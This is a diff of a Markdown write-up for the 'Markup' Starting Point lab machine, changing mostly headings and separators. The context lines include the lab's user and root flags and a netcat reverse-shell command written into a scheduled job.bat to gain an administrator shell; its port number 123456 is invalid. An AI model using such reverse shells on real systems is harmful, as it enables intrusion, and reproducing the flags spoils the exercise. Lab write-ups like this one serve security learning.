@@ -1,10 +1,9 @@
 ### Markup
+
 **OS:** Windows<br>
 **Difficulty:** Very Easy<br>
 **Collection:** [Starting Point Tier 2](/StartingPoint/Tier2/)<br><br>
-
 **Tags:** Apache, SSH, PHP, Reconnaissance, Scheduled Job Abuse, Weak Credentials, Arbitrary File Upload, XXE Injection, Weak Permissions<br>
-**Tools: Nmap, BurpSuite, Netcat**
 
 ---
 
@@ -86,7 +85,11 @@ ssh -i ~/.ssh/id_rsa daniel@10.129.95.192
 
 Once in the target system, we see that there is a file `job.bat` in the C:\Log-Management directory.
 
-## Task 8
+
+
+---
+
+#### Task 8
 *What executable is mentioned in the file mentioned before?*
 > wevtutil.exe 
 
@@ -111,10 +114,16 @@ exit
 
 ---
 
-## User Flag
+
+
+---
+
+#### User Flag
 > 032d2fc8952a8c24e39c8f0ee9918ef7
 
-## Root Flag
+
+
+#### Root Flag
 > f574a3e7650cebd8c39784299cb570f8
 
 We setup a listener on port `123456` of our computer. Then we transfer the Netcat Executable `nc.exe` to the `C:\Log-Management` folder of the target computer. We overwrite the contents of `job.bat` to open a reverse Windows Command Shell. Since the `job.bat` executable runs with Administrator permissions, our command shell will also run with Administrator permissions:
@@ -122,5 +131,7 @@ We setup a listener on port `123456` of our computer. Then we transfer the Netca
 ```Powershell
 daniel@MARKUP C:\Log-Management>echo C:\Log-Management\nc.exe -e cmd.exe 10.10.15.75 123456 > job.bat
 ```
+
+---
 
 ---
